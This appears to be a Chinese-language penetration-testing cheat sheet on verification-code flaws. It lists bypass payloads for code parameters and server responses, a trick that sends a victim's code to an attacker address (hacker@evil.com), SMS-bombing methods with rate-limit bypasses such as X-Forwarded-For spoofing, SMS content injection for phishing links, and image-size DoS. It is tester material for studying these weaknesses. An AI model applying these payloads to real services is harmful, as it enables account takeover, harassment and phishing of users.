## 1. 校验

### 1.1. 前端绕过

验证码没有数据包

### 1.2. 验证码回显

响应包中可以看到验证码

### 1.3. 复用

多次发送使用同一个验证码的数据包, 没有提示验证码错误

### 1.4. 修改请求包

修改请求包验证码参数绕过, 如 `"code":"1234"` 

```
"code":
"code":""
"code":-1
"code":0
"code":1
"code":2
"code":true
"code":True
"code":admin
"code":Admin
"code":null
# 也可以尝试删除整个参数
```

凡是条件判断的都可尝试, 如 `"token"="1234"` 

### 1.5. 四位数字验证码爆破

四位数的数字验证码若没有时间和失败限制, 可爆破

### 1.6. 万能验证码

可能有开发时使用的验证码未删除

```
0000
123456
```

### 1.7. 修改返回包

修改返回包参数绕过, 如 `"result":false` 可改为 `"result":true` 

> 验证码回显成功但是没有绕过, 漏洞可能存在于其他接口

### 1.8. 验证码双发

> 可能存在短信轰炸

将接收验证码的手机号修改为多个可能会收到相同的验证码

```
"mobile"="13888888888","13999999999"
"mobile"="13888888888"&"mobile"="13999999999"
```

邮箱同理

```
 "user" {
     "email" [
              "user@example.com",
              "hacker@evil.com"
       ]
 }
```

### 1.9. 验证码未绑定

- 发送到 A 的验证码在 B 也可用
- A 和 B 一起注册, 可用 A 接收到的验证码注册 B 的账号
- 注册时拦截数据包，修改注册手机号 A 为 B ，A 可能会接收到 B 的注册短信, 但是账号绑定的是 B

### 1.10. 跳过验证

需要多步验证注册时, 可直接修改 URL 跳过某次验证

### 1.11. 生成规律

验证码的生成可能有顺序规律, 或者首次登录时使用的验证码相同

## 2. 轰炸

> 包括手机号, 邮箱和电话

- 横向轰炸

  ```
  可在 Intruder 中向多个不同的手机号发送短信，一般只有众测会收
  ```

- 纵向轰炸

  ```
  可向一个手机号发送多条短信 (尽量将收到的短信全部截图)
  ```

### 2.1. Bypass

- 参数污染

  ```
  使用 Intruder 在手机号位置添加: 空格,Tab,逗号,0,00,86,086,0086,+86,/n,/r,/n/r,/r/n,%00,%0a,%0d,%a0,x,+)WAFXR#!T 等特殊字符
  ```

- 验证码参数

  ```
  删除验证码参数
  删除或修改删除验证码参数的值 -1,0,1,2,true,True,admin,Admin,null
  ```

- Cookie

  ```
  删除或修改 Cookie 的部分值
  ```

- 修改返回值

  ```
  修改返回值为 0,1,true,success (状态码：200)
  ```

- 多发

  ```
  mobile=13888888888,138888888888,138888888888
  mobile=13888888888&mobile=138888888888&mobile=138888888888
  ```

- 伪造为内网 IP

  ```
  添加 X-Forwarded-For:127.0.0.1
  ```

- URL 编码

  ```
  一次的 URL 编码和两次的 URL 编码都尝试一下
  ```

- 并发

- 修改时间戳

  ```

  ```

- 大小写绕过

  ```
  可能出现在邮箱如:
  abc@example.com,Abc@example.com
  ```

## 3. 伪造

当我们在测试任意用户时，往往会利用修改接收手机号，使多个手机号收到同一组验证码

例如拦截发送验证码的请求包

```
mobile:13888888888
```

修改为

```
mobile:13888888888,13899999999
```

这时两个手机号会收到相同的验证码，那么就造成了任意用户漏洞

但是在某些情况下，会只有一个手机号接收到了验证码，验证码为

```
1234,13899999999
```

这就造成了短信伪造漏洞，可以任意修改验证码短信内容，那么我们只需要修改请求包为

```
mobile:13888888888,请点击 https://www.example.com 进行验证
```

用户即可接收到一个含有恶意链接的短信

```
1234,请点击 https://www.example.com 进行验证
```

此漏洞可造成用户的财产损失，传播非法网站等危害

## 4. DoS

### 4.1. Image DoS

图片参数大小可控,导致DoS

```
图片 API 为类似的 URL 时
http://example.com/demo.php/?img=coca-cola.jpg
可修改参数值 (建议先使用一个较小的参数测试，避免服务器崩溃) 查看响应字节和时间是否变化
http://example.com/demo.php/?img=coca-cola.jpg&width=100&height=100
有时需要自己构造参数
```
